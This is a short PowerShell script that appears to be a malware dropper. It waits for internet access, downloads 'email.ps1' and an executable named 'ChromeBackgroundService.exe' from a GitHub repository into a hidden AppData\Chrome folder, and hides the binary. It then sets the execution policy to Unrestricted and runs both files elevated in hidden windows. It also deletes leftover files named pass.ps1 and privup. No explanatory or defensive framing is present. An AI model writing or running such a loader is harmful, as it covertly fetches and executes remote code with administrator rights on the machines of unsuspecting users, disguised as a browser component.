do {
    $ping = test-connection -comp google.com -count 1 -Quiet
} until ($ping)

$homedir = "$env:appdata\Chrome"
$file = "ChromeBackgroundService.exe"
$email = 'start-process PowerShell.exe -ArgumentList "Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $homedir\email.ps1" -WindowStyle Hidden -Verb RunAs'

if( -not (Test-Path -Path $homedir\email.ps1 -PathType Leaf)){Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile $homedir\email.ps1}
if(Test-Path -Path $homedir\pass.ps1 -PathType Leaf){ Remove-Item -Path $home\pass.ps1 -Force }
if(Test-Path -Path $homedir\privup.ps1 -PathType Leaf){ Remove-Item -Path $home\privup.bat -Force }
if (Test-Path -Path $homedir\$file -PathType Leaf) {
powershell -command $email
exit
} else {
Invoke-WebRequest -Uri 'https://github.com/4V4loon/tools/blob/master/ChromeBackgroundService.exe?raw=true' -OutFile $homedir\$file
attrib +h $home\$file
powershell -command $email
start-process PowerShell.exe -ArgumentList "cmd /c $homedir\$file" -WindowStyle Hidden -Verb RunAs
}
